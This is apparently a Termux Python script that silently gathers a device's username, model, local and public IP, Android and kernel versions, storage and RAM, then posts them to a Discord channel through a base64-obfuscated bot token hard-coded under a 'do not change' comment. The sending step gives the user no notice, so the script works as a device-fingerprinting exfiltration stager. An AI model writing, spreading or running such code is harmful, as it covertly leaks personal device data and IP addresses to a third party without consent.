import requests
import socket
import json
import shutil
import subprocess
import base64
import os


os.system("clear")


def decode_base64(encoded_string):
    return base64.b64decode(encoded_string).decode("utf-8")

# Jangan di ganti !
TOKENX = "TVRNMU5qUXdNVGMwTkRNMU9URTVPRGc0TVEuR3Q2bG5vLnRKdDhxNEpETDE0SEkyR1ItWkhsRzd6cnFIcXdBdlNtZDNSN19j"
CHID = "1356402825474740408"

# Token API info perangkat 
TOKEN = decode_base64(TOKENX)

def get_termux_info():
    info = {
        'Time': subprocess.getoutput('date +"%r"'),
        'Username': subprocess.getoutput('whoami'),
        'Device Name': subprocess.getoutput('getprop ro.product.model'),
        'Local IP': socket.gethostbyname(socket.gethostname()),
        'Public IP': subprocess.getoutput('curl -s ifconfig.me'),
        'Android Version': subprocess.getoutput('getprop ro.build.version.release'),
        'Kernel Version': subprocess.getoutput('uname -r')
    }

    total, used, free = shutil.disk_usage('/')
    info['Total Storage'] = f"{total // (2**30)} GB"
    info['Used Storage'] = f"{used // (2**30)} GB"
    info['Free Storage'] = f"{free // (2**30)} GB"

    info['Total RAM'] = subprocess.getoutput("free -h | awk '/Mem:/ {print $2}'")
    info['Used RAM'] = subprocess.getoutput("free -h | awk '/Mem:/ {print $3}'")
    info['Free RAM'] = subprocess.getoutput("free -h | awk '/Mem:/ {print $4}'")

    return info

def send_to_discord(info):
    url = f"https://discord.com/api/v10/channels/{CHID}/messages"
    headers = {
        "Authorization": f"Bot {TOKEN}",
        "Content-Type": "application/json"
    }
    message = "\n".join([f"**{key}:** {value}" for key, value in info.items()])
    data = {"content": f"📝 Info\n```{message}```"}

    response = requests.post(url, headers=headers, json=data)
    

if __name__ == "__main__":
    device_info = get_termux_info()
    send_to_discord(device_info) 
    print(json.dumps(device_info, indent=4))